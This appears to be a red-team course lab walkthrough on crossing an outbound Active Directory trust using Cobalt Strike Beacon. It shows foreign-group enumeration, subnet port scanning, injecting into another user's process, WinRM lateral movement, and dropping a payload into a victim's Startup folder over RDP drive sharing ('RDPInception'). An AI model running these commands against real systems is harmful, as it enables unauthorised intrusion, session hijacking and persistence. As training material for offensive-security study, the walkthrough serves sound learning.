This can be the most difficult type of trust to hop. Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. If we're in Domain A, it's by design that we should not be able to access Domain B, but there are circumstances in which we can slide under the radar. One example includes a SQL Server link created in the opposite direction of the domain trust (see **MS SQL Servers**).

Another, perhaps more realistic scenario, is via RDP drive sharing (a technique dubbed **RDPInception**). When a user enables drive sharing for their RDP session, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto their machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.

`cyberbotic.io` has an outbound trust with `zeropointsecurity.local`.

```
beacon> powershell Get-DomainTrust -Domain cyberbotic.io

SourceName      : cyberbotic.io
TargetName      : zeropointsecurity.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
  

We can actually perform this query from `dev.cyberbotic.io`. Domains may ask other domains that they have trusts with, what _their_ trusts are. So `cyberbotic.io` will happily tell `dev.cyberbotic.io` that it was a trust with `zeropointsecurity.local`. If running that query from inside `cyberbotic.io`, just run `Get-DomainTrust` without the `-Domain` parameter.

Unfortunately, we're not able to enumerate the foreign domain across an outbound trust. So running something like `Get-DomainComputer -Domain zeropointsecurity.local` will not return anything. You will probably see an error like:

```
Exception calling "FindAll" with "0" argument(s): "A referral was returned from the server.
```

  

Instead, the strategy is to find principals in `cyberbotic.io` that are not native to that domain, but are from `zeropointsecurity.local`.

```
beacon> powershell Get-DomainForeignGroupMember -Domain cyberbotic.io

GroupDomain             : cyberbotic.io
GroupName               : Jump Users
GroupDistinguishedName  : CN=Jump Users,CN=Users,DC=cyberbotic,DC=io
MemberDomain            : cyberbotic.io
MemberName              : S-1-5-21-3022719512-2989052766-178205875-1115
MemberDistinguishedName : CN=S-1-5-21-3022719512-2989052766-178205875-1115,CN=ForeignSecurityPrincipals,DC=cyberbotic,DC=io
```

This shows us that there's a domain group in `cyberbotic.io` called `Jump Users`, which contains principals that are not from `cyberbotic.io`. These `ForeignSecurityPrincipals` are like aliases, and even though the SID of the foreign principal is used as a reference, we can't do anything like `ConvertFrom-SID` to find out what that principal actually is.

A methodology that has worked well for me in the past, is to enumerate the current domain (`cyberbotic.io`) and find instances where members of the `Jump Users` group have privileged access (local admins, RDP/WinRM/DCOM access etc), move laterally to those machines, and camp there until you see a member authenticate. Then, impersonate them to hop the trust.

BloodHound will show that `Jump Users` have first degree RDP rights to **EXCH-1** and **SQL-1**.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/jump-users-rdp.png)

  

`Get-DomainGPOUserLocalGroupMapping` and `Find-DomainLocalGroupMember` can both work as well.

```
beacon> powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

```
beacon> powershell Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

Move laterally to `sql-1.cyberbotic.io`. Then access the console of `sql01.zeropointsecurity.local` via the lab dashboard, and open **Remote Desktop Connection**. RDP into `sql-1.cyberbotic.io` as `ZPS\jean.wise`. Ensure that you go into **Local Resources**, click **More** under **Local devices and resources** and enable **Drives** sharing.

From the perspective of the Beacon running on SQL-1, we'll see the logon session:

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> run hostname
sql-1

beacon> net logons
Logged on users at \\localhost:

ZPS\jean.wise
CYBER\SQL-1$
```
  

The network connection:

```
beacon> shell netstat -anop tcp | findstr 3389

  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012
  TCP    10.10.15.90:3389       10.10.18.221:50145     ESTABLISHED     1012
```

And associated processes:

```
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 644   776   ShellExperienceHost.exe      x64   3           ZPS\jean.wise
 1012  696   svchost.exe                  x64   0           NT AUTHORITY\NETWORK SERVICE
 1788  776   SearchUI.exe                 x64   3           ZPS\jean.wise
 3080  776   RuntimeBroker.exe            x64   3           ZPS\jean.wise
 3124  3752  explorer.exe                 x64   3           ZPS\jean.wise
 4960  1012  rdpclip.exe                  x64   3           ZPS\jean.wise
 4980  696   svchost.exe                  x64   3           ZPS\jean.wise
 5008  1244  sihost.exe                   x64   3           ZPS\jean.wise
 5048  1244  taskhostw.exe                x64   3           ZPS\jean.wise
```

Our next set of actions depends on a few things.

1.  Does `jean.wise` have any privileged access in `zeropointsecurity.local`?
2.  Can we reach any useful ports/services (445, 3389, 5985 etc) in `zeropointsecurity.local`?

We haven't been able to answer the first question (yet) because we can't enumerate the domain across the trust. The second question can be answered using the `portscan` command in Beacon.

```
beacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024
10.10.18.221:3389
10.10.18.221:5985

10.10.18.167:139
10.10.18.167:445
10.10.18.167:3389
10.10.18.167:5985
```

Scanner module is complete

  

>  **OPSEC Alert**  
Obviously be cautious about port scanning whole subnets, as networking monitoring tools can detect it.

It appears as though we can access some useful ports on both `dc01` and `sql01`.

Inject a Beacon into one of `jean.wise`'s processes.

```
beacon> inject 4960 x64 tcp-local
[+] established link to child beacon: 10.10.15.90
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/sql1-jeanwise.png)

  

In that Beacon, we are `jean.wise`.

```
beacon> getuid
[*] You are ZPS\jean.wise
```

If we import a tool, like PowerView and do `Get-Domain`, we get a result that is actually returned from the `zeropointsecurity.local` domain.

```
beacon> powershell Get-Domain

Forest                  : zeropointsecurity.local
DomainControllers       : {dc01.zeropointsecurity.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc01.zeropointsecurity.local
RidRoleOwner            : dc01.zeropointsecurity.local
InfrastructureRoleOwner : dc01.zeropointsecurity.local
Name                    : zeropointsecurity.local
```

This works because we're inside a valid `zeropointsecurity.local` domain context. We didn't perform any authentication across that trust, we simply hijacked an existing authenticated session. We can now enumerate the foreign domain, run PowerView, SharpView, SharpHound, whatever we like.

If `jean.wise` has privileged access in `zeropointsecurity.local`, it would be fairly trivial to move laterally from this domain context. We can figure out that `jean.wise` is a member of a `System Admins` domain group, which is a member of the local Administrators on SQL01.

We didn't see port 445 open, so we can't do anything over file shares, but 5985 is.

```
beacon> remote-exec winrm sql01.zeropointsecurity.local whoami; hostname

zps\jean.wise
sql01

beacon> jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
[+] established link to child beacon: 10.10.18.221
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/sql01-jeanwise.png)

  
I use another Pivot Listener here because with the Windows Firewall enabled on SQL01, we can't connect inbound to 445 (so no SMB listener) or other arbitrary ports like 4444 (so no TCP listener). The Windows Firewall is not enabled on SQL-1, so we can bind to a high-port and catch the reverse connection from the Pivot Listener.

If the Windows Firewall was also enabled on SQL-1, we'd likely need to attempt to open a port using `netsh`.

Even if `jean.wise` was not a local admin on SQL01, or if none of the juicy management ports were available, it can still be possible to move laterally via the established RDP channel. This is where the drive sharing comes into play.

Inside `jean.wise`'s RDP session on SQL-1, there's a UNC path called `tsclient` which has a mount point for every drive that is being shared over RDP. `\\tsclient\c` is the C: drive on the origin machine of the RDP session, in this case `sql01.zeropointsecurity.local`.

```
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     02/20/2021 10:14:59   Program Files
          dir     02/20/2021 10:13:41   Program Files (x86)
          dir     03/10/2021 17:19:54   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/20/2021 10:00:17   SQL2019
          dir     02/17/2021 18:47:03   System Volume Information
          dir     03/16/2021 15:24:24   Users
          dir     02/17/2021 18:47:20   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 1gb      fil     03/16/2021 14:22:21   pagefile.sys
```

This gives us the equivalent of standard user read/write access to that drive. This doesn't seem that useful, but what we can do it upload a payload, such as a bat or exe to `jean.wise`'s startup folder. The next time they login, it will execute and we get a shell.

You can simulate this in the lab by disconnecting and reconnecting your console access.

>  Don't put your pivot listener on the Beacon injected into `jean.wise` on SQL-1. When the RDP session is disconnected, the Beacon will die and you'll lose the pivot.

```
beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 174b     fil     05/15/2021 19:00:25   desktop.ini
 281kb    fil     05/15/2021 20:31:00   pivot.exe
```

Disconnect and reconnect to the console of sql01.zeropointsecurity.local to simulate a user logoff/logon, and the Beacon will execute.


![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/rdpinception.png)